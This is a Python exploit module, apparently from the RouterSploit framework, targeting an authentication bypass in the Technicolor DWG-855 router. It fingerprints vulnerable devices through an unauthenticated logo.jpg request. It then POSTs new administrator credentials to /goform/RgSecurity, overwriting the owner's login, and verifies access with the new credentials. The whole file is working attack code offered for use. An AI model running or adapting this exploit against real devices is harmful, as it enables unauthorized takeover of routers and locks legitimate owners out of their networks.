from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    sanitize_url,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Technicolor DWG-855 Authentication Bypass vulnerability.
    If the target is vulnerable, it allows us to overwrite arbitrary configuration parameters.
    """
    __info__ = {
        'name': 'Technicolor DWG-855 Auth Bypass',
        'description': 'Module exploits Technicolor DWG-855 Authentication Bypass vulnerability which allows changing administrator\'s password.\n\nNOTE: This module will errase previous credentials, this is NOT stealthy.',
        'authors': [
            'JPaulMora <https://JPaulMora.GitHub.io>',  # vulnerability discovery, initial routersploit module.
            '0BuRner',  # routersploit module
        ],
        'references': [
            'Bug discovered some time before Aug 2016, this is the first reference to it!\n   This exploit works with any POST parameter, but changing admin creds gives you access to everything else.',
        ],
        'devices': [
            'Technicolor DWG-855',
        ]
    }

    target = exploits.Option('192.168.0.1', 'Target address e.g. http://192.168.0.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')
    nuser = exploits.Option('ruser', 'New user (overwrites existing user)')
    npass = exploits.Option('rpass', 'New password (overwrites existing password)')

    # The check consists in trying to access router resources with incorrect creds. in this case logo.jpg Try it yourself!
    vulnresp = "\x11\x44\x75\x63\x6b\x79\x00"  # Hex data of 0x11 + "Ducky" + 0x00 found on image "logo.jpg"

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Changing", self.target, "credentials to", self.nuser, ":", self.npass)
            url = sanitize_url("{}:{}/goform/RgSecurity".format(self.target, self.port))
            headers = {u'Content-Type': u'application/x-www-form-urlencoded'}
            data = {"HttpUserId": self.nuser, "Password": self.npass, "PasswordReEnter": self.npass, "RestoreFactoryNo": "0x00"}

            response = http_request(method="POST", url=url, headers=headers, data=data)

            if response is None:
                print_error("Target did not answer request.")
            elif response.status_code == 401:
                # Server obeys request but then sends unauthorized response. Here we send a GET request with the new creds.
                infotab_url = sanitize_url("{}:{}/RgSwInfo.asp".format(self.target, self.port))
                check_response = http_request(method="GET", url=infotab_url, auth=(self.nuser, self.npass))

                if check_response.status_code == 200:
                    print_success("Credentials changed!")
                elif response.status_code == 401:
                    print_error("Target answered, denied access.")
                else:
                    pass
            else:
                print_error("Unknown error.")
        else:
            print_error("Exploit failed - Target seems to be not vulnerable")

    @mute
    def check(self):
        url = sanitize_url("{}:{}/logo.jpg".format(self.target, self.port))
        response = http_request(method="GET", url=url, auth=("", ""))
        # print response.text.encode('utf-8')
        if response is not None and self.vulnresp in response.text.encode('utf-8'):
            return True
        else:
            return False
